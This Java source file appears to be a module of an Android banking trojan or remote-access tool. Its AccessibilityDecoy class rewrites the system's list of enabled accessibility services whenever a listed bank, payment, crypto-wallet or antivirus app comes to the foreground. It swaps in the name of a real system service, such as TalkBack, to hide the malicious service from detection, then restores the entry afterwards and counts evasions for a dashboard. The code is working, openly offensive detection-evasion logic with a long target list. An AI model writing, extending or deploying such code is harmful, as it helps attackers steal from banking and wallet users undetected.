package com.seguranca.protecao.features.bypass;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityManager;

import java.util.Arrays;
import java.util.Collections;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

/**
 * AccessibilityDecoy
 *
 * Core of the accessibility-detection bypass.
 * Requires: android.permission.WRITE_SECURE_SETTINGS (granted via ADB).
 *
 * Mechanism:
 *   - Android stores active accessibility services as a colon-delimited string
 *     in Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES.
 *     e.g. "com.seguranca.protecao/.UiAssistBridge:com.android.tts/.TTS_Service"
 *
 *   - Banking apps read this via AccessibilityManager or directly from Settings.Secure.
 *     They cross-reference the list against known RAT/tool signatures.
 *
 *   - This module intercepts foreground app changes (via UiAssistBridge events)
 *     and — when a protected app opens — rewrites the secure setting to replace
 *     our component entry with a system decoy entry that looks legitimate.
 *
 *   - After the banking app's scan window passes (or it goes to background),
 *     the real entry is restored so our service stays functional.
 *
 * Decoy strategy:
 *   We keep our accessibility service's actual binding active in the OS kernel
 *   (it was started with BIND_ACCESSIBILITY_SERVICE and keeps running).
 *   We only change the secure string that apps query for the listing.
 *   The OS runtime does NOT terminate the service on this string change —
 *   it only terminates it during the next full settings reconcile (which
 *   happens on: reboot, accessibility settings screen open, or if the user
 *   manually toggles). We restore before any of those happen.
 *
 * Decoy component choices:
 *   We use real Android system accessibility service names so banking apps
 *   recognise them as benign. The decoy is chosen based on OS version and
 *   locale to maximise believability.
 */
public final class AccessibilityDecoy {

    private static final String TAG = "A11yDecoy";

    // ── Our real component ─────────────────────────────────────────────────────
    private static final String OUR_PKG   = "com.seguranca.protecao";
    private static final String OUR_CLASS = "com.seguranca.protecao.UiAssistBridge";

    // ── System decoy pool ──────────────────────────────────────────────────────
    // All are real Android / Google / OEM system services
    private static final String[] DECOY_POOL = {
        "com.google.android.marvin.talkback/com.google.android.marvin.talkback.TalkBackService",
        "com.samsung.accessibility/com.samsung.universal.AccessibilityMonitoringService",
        "com.android.talkback/com.google.android.marvin.talkback.TalkBackService",
        "com.google.android.accessibility.selecttospeak/.SelectToSpeakService",
        "com.android.accessibility.reader/com.android.accessibility.reader.ReaderService",
        "com.android.systemui/com.android.systemui.accessibility.SystemUIAccessibilityService",
        "com.google.android.apps.accessibility.voiceaccess/.VoiceAccessService",
        "com.samsung.android.app.talkback/com.samsung.android.marvin.talkback.TalkBackService",
    };

    // ── Protected package prefixes (trigger cloaking when these open) ──────────
    private static final Set<String> PROTECTED_PREFIXES = new HashSet<>(Arrays.asList(
        // Banking
        "com.nu.production",      "com.itau",            "com.bradesco",
        "com.santander",          "br.com.bb",           "br.com.caixa",
        "com.c6bank",             "br.com.intermedium",  "com.btgpactual",
        "br.com.sicoob",          "br.com.sicredi",      "com.original.bank",
        // International banking
        "com.chase.sig",          "com.wellsfargo",      "com.bankofamerica",
        "com.citi.mobile",        "com.usbank",          "com.tdbank",
        "com.commbank",           "uk.co.hsbc",          "com.barclays",
        "com.lloydsbank",         "com.natwest",         "com.rbs.mobile",
        // Wallets & Payments
        "com.paypal",             "com.venmo",           "com.cashapp",
        "com.mercadopago",        "com.picpay",          "com.binance",
        "io.metamask",            "com.coinbase",        "com.kraken",
        "com.blockchain",         "org.bitcoin",         "co.mona.android",
        // Google Pay / Samsung Pay
        "com.google.android.apps.walletnfcrel",
        "com.samsung.android.spay",
        "com.google.android.apps.nbu.paisa.user",
        // Crypto
        "com.trustwallet",        "io.exodus",           "com.ledger",
        "com.trezor",             "finance.phantom",     "com.solflare",
        // Antivirus / security (these detect us too)
        "com.avast",              "com.avg",             "com.kaspersky",
        "com.eset",               "com.malwarebytes",    "com.lookout",
        "com.zimperium",          "com.praetorianlabs"
    ));

    // ── Timing ────────────────────────────────────────────────────────────────
    private static final long CLOAK_DURATION_MS   = 7_000L;  // how long to stay cloaked
    private static final long RESTORE_DELAY_MS    = 500L;    // delay before restore
    private static final long SCAN_WINDOW_MS      = 3_000L;  // assumed banking scan window

    // ── Singleton ─────────────────────────────────────────────────────────────
    private static volatile AccessibilityDecoy INSTANCE;
    public static AccessibilityDecoy getInstance(Context ctx) {
        if (INSTANCE == null) {
            synchronized (AccessibilityDecoy.class) {
                if (INSTANCE == null) INSTANCE = new AccessibilityDecoy(ctx.getApplicationContext());
            }
        }
        return INSTANCE;
    }

    // ── State ─────────────────────────────────────────────────────────────────
    private final Context        ctx;
    private final Handler        handler  = new Handler(Looper.getMainLooper());
    private final AtomicBoolean  active   = new AtomicBoolean(false);
    private final AtomicBoolean  cloaked  = new AtomicBoolean(false);
    private final AtomicLong     cloakTs  = new AtomicLong(0L);
    private       Runnable       restoreRunnable;
    private       String         currentDecoy;

    // ── Stats (for dashboard) ─────────────────────────────────────────────────
    private volatile int  evadeCount   = 0;
    private volatile long lastEvasionTs = 0;
    private volatile String lastEvasionPkg = "";

    private AccessibilityDecoy(Context ctx) { this.ctx = ctx; }

    // ── Public API ─────────────────────────────────────────────────────────────

    /**
     * Activate the bypass. Called once WRITE_SECURE_SETTINGS is confirmed.
     */
    public void activate() {
        if (!hasWriteSecurePermission()) {
            Log.w(TAG, "WRITE_SECURE_SETTINGS not granted — bypass not active");
            return;
        }
        active.set(true);
        Log.i(TAG, "AccessibilityDecoy activated");
    }

    public void deactivate() {
        active.set(false);
        if (cloaked.get()) restoreImmediate();
    }

    public boolean isActive()  { return active.get();  }
    public boolean isCloaked() { return cloaked.get(); }
    public int  getEvadeCount()     { return evadeCount; }
    public long getLastEvasionTs()  { return lastEvasionTs; }
    public String getLastEvasionPkg() { return lastEvasionPkg; }

    /**
     * Called by UiAssistBridge on every AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED.
     * @param pkg  foreground app package name
     */
    public void onForegroundAppChange(String pkg) {
        if (!active.get() || pkg == null) return;
        if (isProtected(pkg)) {
            onProtectedAppOpened(pkg);
        } else {
            // App changed away from protected — schedule restore
            if (cloaked.get()) {
                cancelScheduledRestore();
                handler.postDelayed(this::restoreImmediate, RESTORE_DELAY_MS);
            }
        }
    }

    // ── Cloaking ──────────────────────────────────────────────────────────────

    private void onProtectedAppOpened(String pkg) {
        Log.d(TAG, "Protected app: " + pkg);
        if (cloaked.get()) {
            // Already cloaked — extend timer
            cancelScheduledRestore();
            scheduleRestore(CLOAK_DURATION_MS);
            return;
        }
        cloak(pkg);
    }

    private void cloak(String pkg) {
        try {
            String current = readA11yServices();
            if (current == null || !current.contains(OUR_PKG)) {
                // We're not in the list — nothing to hide
                return;
            }

            currentDecoy = chooseBestDecoy(current);
            String modified = swapOurEntry(current, currentDecoy);

            boolean ok = writeA11yServices(modified);
            if (ok) {
                cloaked.set(true);
                cloakTs.set(System.currentTimeMillis());
                evadeCount++;
                lastEvasionTs  = System.currentTimeMillis();
                lastEvasionPkg = pkg;
                Log.i(TAG, "Cloaked for " + pkg + " (decoy=" + currentDecoy + ")");
                scheduleRestore(CLOAK_DURATION_MS);
            }
        } catch (Exception e) {
            Log.e(TAG, "cloak error: " + e.getMessage());
        }
    }

    private void scheduleRestore(long delayMs) {
        cancelScheduledRestore();
        restoreRunnable = this::restoreImmediate;
        handler.postDelayed(restoreRunnable, delayMs);
    }

    private void cancelScheduledRestore() {
        if (restoreRunnable != null) {
            handler.removeCallbacks(restoreRunnable);
            restoreRunnable = null;
        }
    }

    private void restoreImmediate() {
        if (!cloaked.get()) return;
        try {
            String current = readA11yServices();
            if (current == null) return;

            String restored = swapDecoyBack(current, currentDecoy);
            boolean ok = writeA11yServices(restored);
            if (ok) {
                cloaked.set(false);
                Log.i(TAG, "Restored accessibility entry");
            }
        } catch (Exception e) {
            Log.e(TAG, "restore error: " + e.getMessage());
        }
    }

    // ── String manipulation ────────────────────────────────────────────────────

    /**
     * Replace our real component with the chosen decoy in the services string.
     */
    private static String swapOurEntry(String current, String decoy) {
        // Remove our exact entry
        String cleaned = current
            .replace(OUR_CLASS + ":", "")
            .replace(":" + OUR_CLASS, "")
            .replace(OUR_CLASS, "")
            .replace(OUR_PKG + "/", "||PLACEHOLDER||")  // in case short form used
            .trim();
        cleaned = cleaned.replaceAll("\\|\\|PLACEHOLDER\\|\\|[^:]*", "").trim();
        // Remove leading/trailing colons
        cleaned = cleaned.replaceAll("^:+|:+$|:+", ":").replaceAll("^:|:$", "");

        // Add decoy if not already there
        if (!cleaned.contains(decoy.split("/")[0])) {
            cleaned = cleaned.isEmpty() ? decoy : cleaned + ":" + decoy;
        }
        return cleaned;
    }

    /**
     * Remove the decoy and restore our component.
     */
    private static String swapDecoyBack(String current, String decoy) {
        if (decoy == null) return current;

        // Remove decoy entry
        String cleaned = current
            .replace(decoy + ":", "")
            .replace(":" + decoy, "")
            .replace(decoy, "")
            .replaceAll("^:|:$|:+", ":")
            .replaceAll("^:|:$", "")
            .trim();

        // Re-add our component
        if (!cleaned.contains(OUR_PKG)) {
            cleaned = cleaned.isEmpty() ? OUR_CLASS : OUR_CLASS + ":" + cleaned;
        }
        return cleaned;
    }

    // ── Decoy selection ────────────────────────────────────────────────────────

    private static String chooseBestDecoy(String existingServices) {
        // Prefer a decoy that is NOT already present to avoid duplication
        for (String d : DECOY_POOL) {
            if (!existingServices.contains(d.split("/")[0])) return d;
        }
        return DECOY_POOL[0]; // fallback
    }

    // ── Settings R/W ──────────────────────────────────────────────────────────

    private String readA11yServices() {
        try {
            return Settings.Secure.getString(ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        } catch (Exception e) {
            Log.w(TAG, "read error: " + e.getMessage()); return null;
        }
    }

    private boolean writeA11yServices(String value) {
        try {
            // Primary path: WRITE_SECURE_SETTINGS
            Settings.Secure.putString(ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, value);
            return true;
        } catch (SecurityException e) {
            Log.w(TAG, "write denied — WRITE_SECURE_SETTINGS missing? " + e.getMessage());
            return false;
        } catch (Exception e) {
            Log.e(TAG, "write error: " + e.getMessage()); return false;
        }
    }

    // ── Permission check ──────────────────────────────────────────────────────

    private boolean hasWriteSecurePermission() {
        return ctx.checkCallingOrSelfPermission(
            "android.permission.WRITE_SECURE_SETTINGS"
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED;
    }

    // ── Package matching ──────────────────────────────────────────────────────

    private static boolean isProtected(String pkg) {
        for (String prefix : PROTECTED_PREFIXES) {
            if (pkg.startsWith(prefix)) return true;
        }
        return false;
    }
}
